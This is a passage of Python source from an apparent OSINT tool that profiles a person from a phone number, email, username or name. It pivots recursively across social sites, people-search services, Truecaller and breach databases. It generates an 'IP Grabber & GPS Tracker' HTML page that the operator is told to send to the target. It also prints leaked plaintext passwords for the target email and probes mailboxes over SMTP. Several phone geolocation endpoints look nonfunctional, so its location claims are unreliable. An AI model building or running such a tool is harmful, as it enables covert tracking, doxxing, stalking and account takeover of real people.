    print(f"\n{Y}[*] Phase 2 — Intelligent Pattern Analysis{Wh}")
    combined_text = ""
    for url in all_urls[:8]:
        try:
            resp = requests.get(url, headers={"User-Agent": random.choice(CONFIG["user_agents"])}, timeout=6)
            if resp.status_code == 200:
                combined_text += resp.text + "\n"
        except:
            pass

    analyzer = PatternAnalyzer()
    analysis = analyzer.analyze(combined_text) if combined_text else {"names": [], "emails": [], "social_profiles": []}

    if analysis["names"]:
        print(f"  {Gr}{Wh} Names found: {Gr}{len(analysis['names'])}{Wh}")
        for n in analysis["names"][:5]:
            print(f"      {C}{n['value']}{Wh} ({n['confidence']}%)")
    if analysis["emails"]:
        print(f"  {Gr}{Wh} Emails found: {Gr}{len(analysis['emails'])}{Wh}")
        for e in analysis["emails"][:3]:
            print(f"      {C}{e['value']}{Wh}")
    if analysis["social_profiles"]:
        print(f"  {Gr}{Wh} Social profiles: {Gr}{len(analysis['social_profiles'])}{Wh}")
        for s in analysis["social_profiles"][:5]:
            print(f"      {C}{s['url']}{Wh}")

    if not combined_text:
        print(f"  {Y}No pages fetched for analysis{Wh}")

    # 3. People search (only for phone numbers)
    if target_type == "1":
        print(f"\n{Y}[*] Phase 3 — People Search (5 databases){Wh}")
        psm = PeopleSearchManager()
        people_results = psm.search_all(target)
        for site, info in people_results.items():
            names = info.get("data", {}).get("names", [])
            if names:
                print(f"  {Gr}{Wh} {site:<18}: {', '.join(names[:3])}{Wh}")
            else:
                print(f"  {Y}−{Wh} {site:<18}: no data (status {info.get('status', '?')})")

    # 4. Wikipedia lookup for names found
    if analysis["names"]:
        print(f"\n{Y}[*] Phase 4 — Wikipedia Lookup{Wh}")
        for n in analysis["names"][:2]:
            wiki = search_wikipedia(n["value"])
            if wiki["found"]:
                print(f"  {Gr}{Wh} {wiki['title']}: {C}{wiki['url']}{Wh}")
                print(f"    {Y}{wiki['summary'][:150]}...{Wh}")

    # 5. Report
    final_data = {
        "target": target,
        "web_search": {e: len(u) for e, u in web_results.items()},
        "analysis": analysis,
    }
    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="telespotter",
        target=target,
        data=final_data
    )
    save_report(result)
    print(f"\n{Gr}[] Report saved{Wh}")

    # Show direct search URLs
    print(f"\n{Wh} DIRECT SEARCH LINKS ")
    for engine, url in sem.get_search_urls(target).items():
        print(f"{Wh} {engine:<12}: {C}{url}{RS}")
    if target_type == "1":
        psm = PeopleSearchManager()
        for site, url in psm.get_search_urls(target).items():
            print(f"{Wh} {site:<18}: {C}{url}{RS}")

    input(f"\n{Wh}[+] Press Enter")


# 
# Wiwok — Smart Cache, Confidence & SMOS Engine
# 

_CACHE_SENTINEL = object()
_ANSI_STRIP = re.compile(r'\x1b\[[0-9;]*[a-zA-Z]')

class Cache:
    """In-memory request cache with TTL, thread-safe, auto-cleanup."""
    def __init__(self, ttl=300):
        self.store = {}
        self.timestamps = {}
        self._lock = threading.Lock()
        self.ttl = ttl

    def _expired(self, k):
        ts = self.timestamps.get(k)
        return ts is None or (time.time() - ts) > self.ttl

    def get(self, k):
        with self._lock:
            if k in self.store and not self._expired(k):
                return self.store[k]
            self.store.pop(k, None)
            self.timestamps.pop(k, None)
            return _CACHE_SENTINEL

    def put(self, k, v):
        with self._lock:
            self.store[k] = v
            self.timestamps[k] = time.time()
            if len(self.store) > 2000:
                now = time.time()
                expired = [ek for ek, ts in self.timestamps.items()
                           if now - ts > self.ttl]
                for ek in expired:
                    self.store.pop(ek, None)
                    self.timestamps.pop(ek, None)

_CACHE = Cache()

#  Confidence Scoring 
CONF_HIGH   = "HIGH"
CONF_MEDIUM = "MEDIUM"
CONF_LOW    = "LOW"
CONF_NOISE  = "NOISE"

_CONF_RANK = {CONF_HIGH: 3, CONF_MEDIUM: 2, CONF_LOW: 1, CONF_NOISE: 0}

_CONF_NOISE_MODULES = {"google_dorks", "name_dorks", "linkedin_dorks",
                       "wayback_check", "pastebin_search", "duckduckgo_search",
                       "gdelt_news", "unavatar", "username_variants"}

_CONF_API_MODULES = {
    "github_profile", "github_emails", "github_by_email",
    "gitlab_profile", "codeberg_profile", "keybase",
    "reddit_profile", "bluesky_profile", "hackernews_profile",
    "npm_profile", "pypi_profile", "cratesio_profile",
    "rubygems_profile", "dockerhub_profile", "devto_profile",
    "chesscom_profile", "lichess_profile", "myanimelist_profile",
    "anilist_profile", "gravatar", "emailrep", "xposedornot", "hibp",
}

_CONF_SCRAPE_MODULES = {
    "instagram_check", "facebook_check", "tiktok_check",
    "snapchat_check", "youtube_check", "twitch_check",
    "pinterest_check", "steam_check", "mastodon_search",
}

def score_confidence(module_name, line, found_via_api=False):
    """Assign confidence score to a finding line."""
    if module_name in _CONF_NOISE_MODULES:
        return CONF_NOISE
    if module_name in _CONF_API_MODULES:
        return CONF_HIGH
    if module_name in _CONF_SCRAPE_MODULES:
        return CONF_MEDIUM
    if module_name == "telegram_check" and "[+]" in line:
        return CONF_HIGH
    return CONF_MEDIUM

#  Noise Filtering 
_NOISE_PATTERNS = [
    r"\d+%\|", r"\s*\[[-]\]\s", r"Update available", r"github\.com/sherlock-project",
    r"You can run search", r"Too many errors", r"You can see detailed",
    r"Available, Taken", r"Completed \d+ queries", r"QueryError", r"ClientConnector",
    r"ConnectionTimeout", r"SSLCertVerif", r"Using sites database",
    r"Starting a search on top", r"\[\*\] Checking username",
    r"image:\s*https?://", r"it/s\]", r"Some characters could not",
    r"Target factory started", r"scylla\.so is down", r"\[~\]",
    r"websites checked in", r"\*{6,}", r"\[x\]\s", r"\[\?\]\s",
    r"\[\*\] scanning username", r"scanner\(s\) succeeded",
    r"Running scan for phone", r"Results for googlesearch",
    r"Results for local", r"^\s*Raw local:", r"BTC Donations",
    r"Heartfelt", r"Official h8mail", r"Removing duplicates",
    r"^\[!\]", r"^\[-\]",
]

_NOISE_RE = re.compile("|".join(f"({p})" for p in _NOISE_PATTERNS))

def filter_noise(text, target=""):
    out = []
    for ln in text.splitlines():
        ln = _ANSI_STRIP.sub("", ln).rstrip()
        if not ln.strip() or _NOISE_RE.search(ln):
            continue
        out.append(ln)
    return out

#  Auto Target Detection 
_PAT_EMAIL_RE    = re.compile(r"^[\w.+\-]+@[\w.\-]+\.[a-zA-Z]{2,}$")
_PAT_PHONE_RE    = re.compile(r"^(?:\+[\d\s\-()]{7,20}|(?:0|62)\d{7,13})$")
_PAT_USERNAME_RE = re.compile(r"^[a-zA-Z0-9_.\-]{2,50}$")

def detect_target_type(s):
    s = s.strip()
    if _PAT_EMAIL_RE.match(s):
        return "email"
    if _PAT_PHONE_RE.match(s):
        return "phone"
    if " " in s:
        return "name"
    if _PAT_USERNAME_RE.match(s):
        return "username"
    return "username"

def sanitize_target(s):
    s = s.strip()
    if not s:
        raise ValueError("target is empty")
    if len(s) > 200:
        raise ValueError("target is too long")
    bad = re.search(r'[;&|`$\n\r<>()\[\]{}\\\'\"#^~*!]', s)
    if bad:
        raise ValueError("invalid characters in target")
    return s

#  Entity Extraction with Confidence 
def extract_entities(output, module_name):
    findings = []
    for line in output.splitlines():
        ln = line.strip()
        if not ln:
            continue
        conf = score_confidence(module_name, ln)
        if conf == CONF_NOISE:
            continue
        for m in re.findall(r'\b[\w.+\-]{2,}@[\w.\-]+\.[a-zA-Z]{2,}\b', ln):
            if "noreply" not in m and "example" not in m:
                findings.append(("email", m.lower(), conf))
        for m in re.findall(r'\+\d[\d\s\-]{6,15}\d', ln):
            findings.append(("phone", m.strip(), conf))
        um = re.search(r'username\s*[:\-]\s*([a-zA-Z0-9_.\-]{2,40})', ln, re.I)
        if um:
            findings.append(("username", um.group(1).strip(), conf))
        nm = re.search(r'(?:name|full_name|display_name)\s*[:\-]\s*(.{3,60})', ln, re.I)
        if nm:
            val = nm.group(1).strip().strip('"\'')
            if len(val) > 2 and val.lower() not in ("-", "none", "null"):
                findings.append(("name", val, conf))
    return findings

#  Deduplication & Merging 
def _normalize_value(category, value):
    v = value.strip()
    if category == "email":    return v.lower()
    if category == "phone":    return re.sub(r"[\s\-()]", "", v)
    if category == "username": return v.lower()
    if category == "name":     return v.lower()
    return v.lower()

def merge_into_profile(profile, category, value, confidence, source_module, source_target):
    key = f"{category}:{_normalize_value(category, value)}"
    if key not in profile:
        profile[key] = {
            "category": category, "value": value,
            "confidence": confidence, "sources": [],
        }
    else:
        existing_rank = _CONF_RANK.get(profile[key]["confidence"], 0)
        new_rank = _CONF_RANK.get(confidence, 0)
        if new_rank > existing_rank:
            profile[key]["confidence"] = confidence
    src = f"{source_module}@{source_target}"
    if src not in profile[key]["sources"]:
        profile[key]["sources"].append(src)

def build_pivot_queue(inv_data, already_investigated):
    new_pivots = []
    for r in inv_data.get("results", []):
        if not r.get("ok"):
            continue
        entities = extract_entities(r.get("output", ""), r["module"])
        for cat, val, conf in entities:
            if conf == CONF_NOISE:
                continue
            if val not in already_investigated:
                new_pivots.append((val, cat))
    return new_pivots[:6]


def smart_osint():
    """SMOS — Smart OSINT: استقصاء متعدد المستويات مع اكتشاف تلقائي"""
    print(f"\n {Wh}{'='*55}")
    print(f" {R} SMOS — SMART OSINT INVESTIGATION")
    print(f" {Wh}{'='*55}")
    print(f"{Y}[!] Multi-level recursive pivot · Confidence scoring · Profile builder{Wh}")

    target = input(f"\n{Wh}[+] Target {Gr}[email, username, phone, name]{Wh}: {Gr}").strip()
    if not target:
        return
    try:
        target = sanitize_target(target)
    except ValueError as e:
        print(f"{R}[!] {e}{Wh}")
        input(f"[+] Press Enter")
        return

    ttype = detect_target_type(target)
    print(f"{Wh}  Detected type: {Gr}{ttype}{Wh}")

    max_depth = input(f"{Wh}[+] Max depth {Gr}[0-2, default=1]{Wh}: {Gr}").strip()
    max_depth = int(max_depth) if max_depth.isdigit() else 1
    max_depth = min(max_depth, 2)

    investigated = {}
    pivot_graph = {}
    unified_profile = {}
    queue = [(target, ttype, 0)]

    print(f"\n{Y}[*] Starting SMOS investigation...{Wh}")
    start_time = time.time()

    while queue and len(investigated) < 12:
        current, ctype, depth = queue.pop(0)
        if current in investigated:
            continue

        print(f"\n{Wh}[{Gr}>{Wh}] Investigating {Gr}{current}{Wh} ({ctype}) [depth {depth}]")
        investigated[current] = {"type": ctype, "results": [], "depth": depth}

        if ctype == "email":
            node = investigate_email_agentic(current, depth)
            r = {"ok": True, "module": "agentic_email", "output": str(node.findings)}
            investigated[current]["results"].append(r)
            for cat, val in [("username", current.split("@")[0])]:
                merge_into_profile(unified_profile, cat, val, CONF_MEDIUM,
                                   "agentic_email", current)
            for child in node.children:
                merge_into_profile(unified_profile, child.data_type, child.value,
                                   CONF_MEDIUM, "agentic_email_child", current)
            if node.findings.get("breaches"):
                merge_into_profile(unified_profile, "breach",
                                   str(node.findings["breaches"]), CONF_HIGH,
                                   "hibp", current)
        elif ctype == "username":
            node = investigate_username_agentic(current, depth)
            r = {"ok": True, "module": "agentic_username", "output": str(node.findings)}
            investigated[current]["results"].append(r)
            merge_into_profile(unified_profile, "username", current, CONF_MEDIUM,
                               "agentic_username", current)
            for child in node.children:
                merge_into_profile(unified_profile, child.data_type, child.value,
                                   CONF_HIGH, "agentic_username_child", current)
        elif ctype == "phone":
            try:
                ultra_data = {"carrier": "see PhoneTracker"}
                merge_into_profile(unified_profile, "phone", current, CONF_HIGH,
                                   "phone_check", current)
            except:
                pass
        elif ctype == "name":
            wiki = search_wikipedia(current)
            if wiki["found"]:
                merge_into_profile(unified_profile, "name", current, CONF_HIGH,
                                   "wikipedia", current)

        if depth < max_depth:
            new_pivots = build_pivot_queue(investigated[current],
                                           set(investigated.keys()))
            pivot_graph[current] = [t for t, _ in new_pivots]
            for pt, ptype in new_pivots:
                if pt not in investigated:
                    queue.append((pt, ptype, depth + 1))

    elapsed = time.time() - start_time

    print(f"\n{Wh} SMOS REPORT ")
    print(f"{Wh} Seed          : {C}{target}")
    print(f"{Wh} Type          : {Gr}{ttype}")
    print(f"{Wh} Targets       : {Gr}{len(investigated)}")
    print(f"{Wh} Duration      : {Gr}{elapsed:.1f}s")
    print(f"{Wh} Pivot chains  : {Gr}{len(pivot_graph)}{Wh}")

    if unified_profile:
        print(f"\n{Gr} UNIFIED PROFILE:{Wh}")
        ordered = sorted(unified_profile.items(),
                         key=lambda x: _CONF_RANK.get(x[1]["confidence"], 0),
                         reverse=True)
        for key, entry in ordered[:15]:
            icon = {"email": "", "phone": "", "username": "",
                    "name": "", "breach": ""}.get(entry["category"], "•")
            conf_color = {CONF_HIGH: Gr, CONF_MEDIUM: Y, CONF_LOW: R}.get(entry["confidence"], Wh)
            print(f"  {icon} {conf_color}{entry['value']}{Wh} [{conf_color}{entry['confidence']}{Wh}]")

    result_data = {
        "mode": "smos",
        "seed": target,
        "seed_type": ttype,
        "targets_scanned": len(investigated),
        "profile": unified_profile,
        "pivot_graph": pivot_graph,
    }
    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="smos",
        target=target,
        data=result_data
    )
    save_report(result)
    print(f"\n{Gr}[] SMOS report saved{Wh}")

    input(f"\n{Wh}[+] Press Enter")


#  Folium Map Generator 
def generate_location_map(lat: float, lon: float, label: str, output_file: str = "location_map.html") -> str:
    """إنشاء خريطة تفاعلية للموقع"""
    try:
        import folium
        m = folium.Map(location=[lat, lon], zoom_start=14)
        folium.Marker([lat, lon], popup=label, tooltip=label,
                      icon=folium.Icon(color='red', icon='phone', prefix='fa')).add_to(m)
        filepath = Path(CONFIG["output_dir"]) / output_file
        m.save(str(filepath))
        return str(filepath)
    except ImportError:
        return "Install folium: pip install folium"
    except:
        return "Map generation failed"


#  PhoneGW_Ultra — النسخة المتطورة 
def phoneGW_Ultra():
    print(f"\n {Wh}{'='*55}")
    print(f" {R} PHONETRACKER PRO v5.0 — ULTRA")
    print(f" {Wh}{'='*55}")
    print(f"{Y}[!] Consensus voting · Truecaller 3x · IP Grabber · Evidence chain{Wh}")

    user_input = input(f"\n{Wh}[+] Phone number {Gr}[with country code]{Wh}: {Gr}").strip()
    if not user_input:
        return

    if user_input.startswith('+'):
        user_phone = user_input
    else:
        for code in sorted(COUNTRY_CODES.keys(), key=len, reverse=True):
            if user_input.startswith(code):
                user_phone = f"+{user_input}"
                break
        else:
            user_phone = user_input

    user_phone = re.sub(r'[^\d+]', '', user_phone)
    if not validate_phone(user_phone):
        print(f"{R}[!] Invalid phone number format!")
        input(f"\n{Wh}[+] Press Enter")
        return

    clean_digits = re.sub(r'\D', '', user_phone)
    cc = ""
    for code in sorted(COUNTRY_CODES.keys(), key=len, reverse=True):
        if user_phone.startswith(f"+{code}"):
            cc = code
            break

    # سلسلة حفظ الأدلة
    chain = ChainOfCustody(f"PHONE-{clean_digits[:6]}", "Ghost0xK_Operator")
    chain.log_evidence("Scan started", f"Phone: {user_phone}, Country Code: {cc}")

    print(f"\n{Y}[*] Phase 1 — Multi-API Location Consensus{Wh}")

    voter = LocationConsensusVoter()
    location_sources = []

    # 8 APIs للموقع
    api_list = [
        ("ipapi", f"https://ipapi.com/ip_api.php?phone={clean_digits}", 0.7),
        ("ipdata", f"https://api.ipdata.co/phone/{clean_digits}?api-key=test", 0.6),
        ("abstract", f"https://phonevalidation.abstractapi.com/v1/?phone={clean_digits}&api_key=test", 0.6),
        ("numverify", f"http://apilayer.net/api/validate?access_key=&number={clean_digits}", 0.5),
        ("veriphone", f"https://api.veriphone.io/v2/verify?phone={clean_digits}&key=test", 0.6),
        ("ipwhois", f"https://ipwhois.io/phone/{clean_digits}", 0.5),
        ("findandtrace", f"https://www.findandtrace.com/trace-mobile-number?number={clean_digits}", 0.4),
        ("mobiletracker", f"https://www.mobiletracker.net/api/lookup?number={clean_digits}", 0.4),
    ]

    for name, url, conf in api_list:
        try:
            resp = requests.get(url, timeout=6, headers={"User-Agent": random.choice(CONFIG["user_agents"])})
            if resp.status_code == 200:
                data = resp.json() if resp.text.startswith("{") else {}
                city = data.get("city") or data.get("location") or data.get("country_name") or ""
                if city:
                    voter.add_vote(city, name, conf)
                    location_sources.append(name)
                    print(f"  {Gr}{Wh} {name:<15}: {city}")
        except:
            pass

    consensus = voter.consensus_vote()
    if consensus:
        print(f"\n  {C}Consensus: {Gr}{consensus['city']}{Wh} ({consensus['confidence']*100:.0f}% confidence, {consensus['votes']})")
        chain.log_evidence("Consensus vote", f"City: {consensus['city']}, Confidence: {consensus['confidence']}")
    else:
        print(f"  {Y}No location data available{Wh}")

    print(f"\n{Y}[*] Phase 2 — Truecaller Triple Probe{Wh}")
    tc = TruecallerProbe()
    tc_result = tc.search_truecaller(user_phone, cc, clean_digits)
    if tc_result.get("found"):
        print(f"  {Gr}{Wh} Name : {Gr}{tc_result['name']}{Wh}")
        if tc_result.get("email"):
            print(f"  {Gr}{Wh} Email: {Gr}{tc_result['email']}{Wh}")
        print(f"  {Y}  Method: {tc_result['method']}{Wh}")
        chain.log_evidence("Truecaller hit", f"Name: {tc_result['name']}, Method: {tc_result['method']}")
    else:
        print(f"  {Y}No Truecaller data found{Wh}")

    print(f"\n{Y}[*] Phase 3 — IP Grabber & GPS Tracker{Wh}")
    ipg = IPGrabber()
    track_id = uuid.uuid4().hex[:8]
    tracking_html = ipg.generate_tracking_page(user_phone, track_id)
    html_path = Path(CONFIG["output_dir"]) / f"tracker_{track_id}.html"
    html_path.write_text(tracking_html, encoding="utf-8")
    print(f"  {C}Tracking page: {Gr}{html_path}{Wh}")
    print(f"  {Y}Send this file to target or host on a server{Wh}")
    chain.log_evidence("IP Grabber created", f"Track ID: {track_id}, File: {html_path}")

    print(f"\n{Y}[*] Phase 4 — Wikipedia Entity Lookup{Wh}")
    entity_name = tc_result.get("name", "") if tc_result.get("found") else ""
    if not entity_name:
        search_term = input(f"  {Wh}[+] Enter name/person to search {Gr}[or Enter to skip]{Wh}: {Gr}").strip()
        if search_term:
            entity_name = search_term
    if entity_name:
        wiki = search_wikipedia(entity_name)
        if wiki["found"]:
            print(f"  {Gr}{Wh} Wikipedia: {C}{wiki['url']}{Wh}")
            print(f"  {Y}  {wiki['summary'][:200]}...{Wh}")
            chain.log_evidence("Wikipedia lookup", f"Entity: {wiki['title']}")
        else:
            print(f"  {Y}No Wikipedia entry found{Wh}")

    print(f"\n{Y}[*] Phase 5 — Evidence Chain & Report{Wh}")
    chain.log_evidence("Scan completed", f"Sources: {', '.join(location_sources) if location_sources else 'basic'}")
    custody_report = chain.generate_custody_report()

    # Map generation if GPS found
    map_file = None
    if consensus:
        lat_lon = None
        if isinstance(consensus.get("city"), str):
            try:
                geo_resp = requests.get(
                    f"https://nominatim.openstreetmap.org/search?q={consensus['city']}&format=json&limit=1",
                    headers={"User-Agent": "Ghost0xK/1.0"}, timeout=8
                )
                if geo_resp.status_code == 200:
                    geo_data = geo_resp.json()
                    if geo_data:
                        lat_lon = (float(geo_data[0]["lat"]), float(geo_data[0]["lon"]))
            except:
                pass
        if lat_lon:
            map_file = generate_location_map(lat_lon[0], lat_lon[1], consensus["city"])
            if map_file and "Error" not in map_file and "Install" not in map_file:
                print(f"  {C}Map: {Gr}{map_file}{Wh}")

    print(f"\n{C}{custody_report}{Wh}")

    # Final result
    final_data = {
        "phone": user_phone,
        "country_code": cc,
        "location_consensus": consensus,
        "truecaller": tc_result,
        "tracking_page": str(html_path),
        "chain_of_custody": chain.evidence_chain,
    }
    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="phone_ultra",
        target=user_phone,
        data=final_data
    )
    save_report(result)
    print(f"{Gr}[] Full report saved{Wh}")

    input(f"\n{Wh}[+] Press Enter")


def phoneGW():
    print(f"\n {Wh}{'='*50}")
    print(f" {R} PHONE NUMBER TRACKER (ENHANCED)")
    print(f" {Wh}{'='*50}")
    
    print(f"{Wh}[?] Enter phone number {Gr}[with country code, e.g., +212612345678]{Wh}")
    user_input = input(f"\n{Wh}[+] Phone: {Gr}").strip()
    
    if user_input.startswith('+'):
        user_phone = user_input
    else:
        for code in sorted(COUNTRY_CODES.keys(), key=len, reverse=True):
            if user_input.startswith(code):
                user_phone = f"+{user_input}"
                break
        else:
            user_phone = user_input
    
    user_phone = re.sub(r'[^\d+]', '', user_phone)
    
    if not validate_phone(user_phone):
        print(f"{R}[!] Invalid phone number format!")
        print(f"{Y}[*] Example: +212612345678")
        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
        return
    
    print(f"\n {Wh}{'='*50}")
    print(f" {R} PHONE NUMBER INFORMATION")
    print(f" {Wh}{'='*50}")
    
    try:
        for code in sorted(COUNTRY_CODES.keys(), key=len, reverse=True):
            if user_phone.startswith(f"+{code}") or user_phone.startswith(code):
                print(f"{Wh} Country        : {Gr}{COUNTRY_CODES[code]}")
                print(f"{Wh} Country Code   : {Gr}+{code}")
                break
        
        default_region = "US"
        parsed_number = phonenumbers.parse(user_phone, default_region)
        
        carrier_name = carrier.name_for_number(parsed_number, "en") or "Unknown"
        carrier_country = geocoder.description_for_number(parsed_number, "en")
        tzones = ', '.join(phone_timezone.time_zones_for_number(parsed_number))
        
        num_type = phonenumbers.number_type(parsed_number)
        type_map = {
            phonenumbers.PhoneNumberType.MOBILE: "Mobile",
            phonenumbers.PhoneNumberType.FIXED_LINE: "Fixed Line",
            phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "Fixed Line/Mobile",
            phonenumbers.PhoneNumberType.VOIP: "VoIP",
            phonenumbers.PhoneNumberType.TOLL_FREE: "Toll Free",
            phonenumbers.PhoneNumberType.PREMIUM_RATE: "Premium Rate",
            phonenumbers.PhoneNumberType.SHARED_COST: "Shared Cost",
            phonenumbers.PhoneNumberType.PAGER: "Pager",
            phonenumbers.PhoneNumberType.UAN: "UAN",
            phonenumbers.PhoneNumberType.VOICEMAIL: "Voicemail",
        }
        num_type_str = type_map.get(num_type, "Other")
        
        data = {
            "Valid Number": phonenumbers.is_valid_number(parsed_number),
            "Possible Number": phonenumbers.is_possible_number(parsed_number),
            "Country": carrier_country,
            "Country Code": f"+{parsed_number.country_code}",
            "National Number": parsed_number.national_number,
            "International Format": phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
            "E.164 Format": phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.E164),
            "National Format": phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.NATIONAL),
            "RFC3966 Format": phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.RFC3966),
            "Type": num_type_str,
            "Carrier": carrier_name,
            "Timezone": tzones,
        }
        
        for key, value in data.items():
            if value and value != "Unknown" and value != "Other":
                print(f"{Wh} {key:<18}: {Gr}{value}")
        
        print(f"\n{Y}[*] Fetching enhanced carrier data...{Wh}")
        carrier_details = get_phone_carrier_details(user_phone)
        if carrier_details.get('carrier_api'):
            api_data = carrier_details['carrier_api']
            print(f"{Wh} Carrier API    : {Gr}{api_data.get('name', 'N/A')}")
            print(f"{Wh} Line Type      : {Gr}{api_data.get('line_type', 'N/A')}")
            print(f"{Wh} Ported Status  : {Gr}{api_data.get('is_ported', 'N/A')}")
            data['CarrierDetails'] = carrier_details
        
        print(f"\n{Y}[*] Checking data breaches...{Wh}")
        breaches = check_phone_breaches(user_phone)
        if breaches['found']:
            print(f"{R}[!] Phone found in {breaches['count']} data breaches!{Wh}")
            if breaches['sources']:
                print(f"{R}    Sources: {', '.join(breaches['sources'][:5])}{Wh}")
            data['Breaches'] = breaches
        else:
            print(f"{Gr}[+] No breaches found for this number{Wh}")
        
        print(f"\n{Y}[*] Searching social media platforms...{Wh}")
        social_data = search_phone_social_media(user_phone)
        if social_data.get('profiles'):
            print(f"{Gr}[+] Found {len(social_data['profiles'])} associated names{Wh}")
            for name in social_data['profiles'][:3]:
                print(f"    {Wh}- {Gr}{name}{Wh}")
            data['SocialProfiles'] = social_data['profiles']
        
        print(f"\n{Y}[*] Performing reverse lookup...{Wh}")
        reverse_info = get_phone_reverse_lookup(user_phone)
        if reverse_info.get('name'):
            print(f"{Gr}[+] Associated name: {reverse_info['name']}{Wh}")
            data['ReverseLookup'] = reverse_info
        
        print(f"\n {Wh}{'='*50}")
        print(f" {R} MESSAGING DIRECT LINKS")
        print(f" {Wh}{'='*50}")
        
        clean_number = re.sub(r'[^\d+]', '', user_phone)
        if not clean_number.startswith('+'):
            clean_number = '+' + clean_number
        clean_digits = re.sub(r'\D', '', clean_number)
        
        print(f"{Wh} WhatsApp       : {C}https://wa.me/{clean_number}{RS}")
        print(f"{Wh} Telegram       : {C}https://t.me/{clean_number}{RS}")
        print(f"{Wh} Signal         : {C}https://signal.me/#p/{clean_number}{RS}")
        print(f"{Wh} Viber          : {C}viber://chat?number={clean_digits}{RS}")
        
        print(f"\n {Wh}{'='*50}")
        print(f" {R} WEB SEARCH LINKS")
        print(f" {Wh}{'='*50}")
        print(f"{Wh} Google         : {C}https://www.google.com/search?q={clean_number}{RS}")
        print(f"{Wh} Truecaller     : {C}https://www.truecaller.com/search/{clean_digits}{RS}")
        print(f"{Wh} SpyDialer      : {C}https://spydialer.com/default.aspx?search={clean_digits}{RS}")
        print(f"{Wh} Whitepages     : {C}https://www.whitepages.com/phone/{clean_digits}{RS}")
        print(f"{Wh} 800Notes       : {C}https://800notes.com/Phone.aspx/{clean_digits}{RS}")
        print(f"{Wh} CallerCenter   : {C}https://callercenter.com/{clean_digits}{RS}")
        print(f"{Wh} Numlookup      : {C}https://numlookup.com/{clean_digits}{RS}")
        
        display_phone_summary(clean_number, data)
        
        result = ScanResult(
            timestamp=datetime.now().isoformat(),
            scan_type="phone",
            target=user_phone,
            data=data
        )
        save_report(result)
        
    except phonenumbers.NumberParseException as e:
        print(f"{R}[!] Error parsing number: {e}")
    except Exception as e:
        print(f"{R}[!] Error: {e}")
    
    input(f"\n{Wh}[+{Wh}] Press Enter to continue")


def check_email_breaches_advanced(email: str) -> Dict:
    """التحقق المتقدم من اختراقات البريد الإلكتروني (3 مصادر)"""
    results = {'breaches': [], 'total_breaches': 0, 'pastes': [], 'leaked_data': {}, 'passwords': []}
    
    checker = BreachChecker()
    
    try:
        headers = {'hibp-api-key': '', 'User-Agent': 'Ghost0xK-OSINT/1.0'}
        resp = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", headers=headers, timeout=10)
        if resp.status_code == 200:
            breaches = resp.json()
            results['breaches'] = breaches
            results['total_breaches'] = len(breaches)
            for breach in breaches[:10]:
                results['leaked_data'][breach.get('Name', 'Unknown')] = {
                    'date': breach.get('BreachDate', 'N/A'),
                    'data_classes': breach.get('DataClasses', [])
                }
        elif resp.status_code == 404:
            results['total_breaches'] = 0
    except: pass
    
    try:
        resp = requests.get(f"https://monitor.firefox.com/api/v1/breach-stats?email={email}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('breachCount', 0) > 0:
                results['total_breaches'] = max(results['total_breaches'], data.get('breachCount', 0))
    except: pass
    
    try:
        resp = requests.get(f"https://psbdmp.ws/api/search/{email}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            pastes = data.get('data', [])
            results['pastes'] = [{'id': p['id'], 'title': p.get('title', 'No title')[:50]} for p in pastes[:10]]
    except: pass
    
    print(f"{Y}[*] Checking Hudson Rock database...{Wh}")
    hudson = checker.check_hudsonrock(email)
    if hudson:
        results['total_breaches'] += 1
        results['leaked_data']['HudsonRock'] = {'source': 'Infostealer Malware', 'found': True}
        print(f"    {R}[!] Email associated with infected computer (Hudson Rock){Wh}")
    
    print(f"{Y}[*] Checking ProxyNova leak database...{Wh}")
    proxynova = checker.check_proxynova(email)
    if proxynova:
        results['passwords'] = proxynova[:5]
        results['leaked_data']['ProxyNova'] = {'passwords_found': len(proxynova)}
        print(f"    {R}[!] Found {len(proxynova)} leaked passwords via ProxyNova{Wh}")
        for pwd in proxynova[:3]:
            print(f"    {R}    - {pwd}{Wh}")
    
    return results


def verify_email_smtp_advanced(email: str) -> Dict:
    """التحقق المتقدم من وجود البريد عبر SMTP"""
    result = {'valid': False, 'reason': '', 'mx_records': [], 'catch_all': False}
    
    domain = email.split('@')[1]
    
    try:
        import dns.resolver
        import smtplib
        mx_records = []
        answers = dns.resolver.resolve(domain, 'MX')
        for rdata in answers:
            mx_records.append({'exchange': str(rdata.exchange).rstrip('.'), 'preference': rdata.preference})
        mx_records.sort(key=lambda x: x['preference'])
        result['mx_records'] = mx_records
        
        if mx_records:
            for mx in mx_records[:2]:
                try:
                    smtp = smtplib.SMTP(mx['exchange'], 25, timeout=10)
                    smtp.ehlo()
                    smtp.mail('verify@test.com')
                    code, msg = smtp.rcpt(email)
                    smtp.quit()
                    
                    if code == 250:
                        result['valid'] = True
                        result['reason'] = 'Server accepted recipient'
                        break
                    elif code == 251:
                        result['valid'] = True
                        result['reason'] = 'Forwarding user (non-local)'
                        break
                    elif code == 450 or code == 452:
                        result['reason'] = 'Temporary failure, try again'
                    elif code == 550:
                        result['reason'] = 'Mailbox does not exist'
                except:
                    continue
    except: pass
    
    return result


def search_email_on_github_advanced(email: str) -> Dict:
    """البحث المتقدم عن البريد في GitHub"""
    results = {'repos': [], 'commits': [], 'gists': [], 'issues': []}
    
    headers = {'Accept': 'application/vnd.github.v3+json'}
    
    try:
        resp = requests.get(f"https://api.github.com/search/code?q={email}", headers=headers, timeout=10)
        if resp.status_code == 200:
            for item in resp.json().get('items', [])[:15]:
                results['repos'].append({
                    'repo': item.get('repository', {}).get('full_name', 'N/A'),
                    'path': item.get('path', 'N/A'),
                    'url': item.get('html_url', 'N/A')
                })
    except: pass
    
    try:
        resp = requests.get(f"https://api.github.com/search/commits?q=author-email:{email}", headers=headers, timeout=10)
        if resp.status_code == 200:
            for item in resp.json().get('items', [])[:10]:
                results['commits'].append({
                    'repo': item.get('repository', {}).get('full_name', 'N/A'),
